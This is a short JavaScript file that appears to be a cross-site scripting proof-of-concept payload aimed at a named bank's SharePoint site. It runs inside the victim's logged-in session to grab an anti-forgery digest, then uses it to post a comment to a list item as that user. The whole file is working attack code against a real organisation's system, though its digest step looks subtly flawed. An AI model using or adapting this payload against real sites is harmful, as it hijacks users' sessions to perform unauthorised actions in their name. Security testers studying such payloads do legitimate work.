(function(){
  const GET_DIGEST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx';
  const POST_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';      

  function sendPost(digest){
    var x = new XMLHttpRequest();
    x.open('POST', POST_URL, true);
    x.withCredentials = true;
    x.setRequestHeader('X-RequestDigest', digest);
    x.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
    x.send(JSON.stringify({ text: "-----23-----", mentions: [] }));
  }

  var g = new XMLHttpRequest();
  g.open('GET', GET_DIGEST_URL, true);
  g.withCredentials = true;
  g.onload = function(){
    if(g.status === 200){
      try {
        var digest = JSON.parse(g.responseText).formDigestValue;
        if(digest) sendPost(digest);
      } catch(e) {
        console.error('Cannot parse formDigestValue');
      }
    }
  };
  g.onerror = function(){ console.error('GET request failed'); };
  g.send();
})();
